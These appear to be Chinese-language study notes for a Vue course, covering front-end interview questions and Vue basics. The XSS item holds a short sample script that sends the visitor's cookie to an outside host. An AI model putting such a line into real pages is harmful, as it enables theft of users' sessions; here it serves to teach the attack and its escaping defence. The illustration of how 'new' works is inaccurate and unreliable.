# Vue

## day2-2

### 面试题
* xss攻击，与防御
    * 跨域脚本攻击
    ```js
        ​<img src="xxx" onclick="go()" />
        <h4 style="color:#58bc58">点我有惊喜</h4>
        <script>
            localtion.href="http://www.laoxie.com?data="+document.cookie
        </script>
    ```
    * 防御：
        * 对输入输出进行过滤
        ```html
            ​&lt;img src="xxx" onclick="go()" /&gt;
        ```
* 实例化过程经历什么 new String()
    ```js
        function Mayun(){
            // 1. 创建一个对象
            let obj = {};

            //2. 将this指向obj
            Mayun.bind(obj)

            // 3. 执行内部代码，给obj添加属性
            this.xx1 = 'xx1'
            this.xx2 = 'xx2'
            this.xx3 = 'xx3'

            // 4. 改变原型对象
            obj.__proto__ = Mayun.prototype

            // 5. 返回这个对象
            return obj
        }

        let my = new Mayun();// Mayun()

    ```
* 什么叫轮询
    * 用自己的语言表达出来
* 事件绑定方式，和移除方式
```js
    <button onclick="show()">点我有惊喜</button>

    ele.onclick = show; // ele.onclick = null;
    ele.addEventListener('click',show,false);// ele.removeEventListener('click',show,false)

    function show(){
        
    }
```
* 二次封装
    * 提高开发效率
    * 在封装的基础上再封装
* 防抖与节流
    * 目的为了优化性能
    * 节流：只执行第一次，忽略后面所有操作
        * 滚动加载
    * 防抖：只执行最后一次，忽略前面所有操作
        * 百度搜索建议

### 知识点
* 前端三大框架
    * angular
    * react
    * vue
* 渐进式
    * 核心 -> 配套框架、插件 -> 扩展性
* 安装版本
    * 开发版本  development
        * 完整未压缩：调试、测试，本地开发使用
    * 生产版本  production
        * 压缩合并：删除了警告，上线使用
    * CDN
    * npm / yarn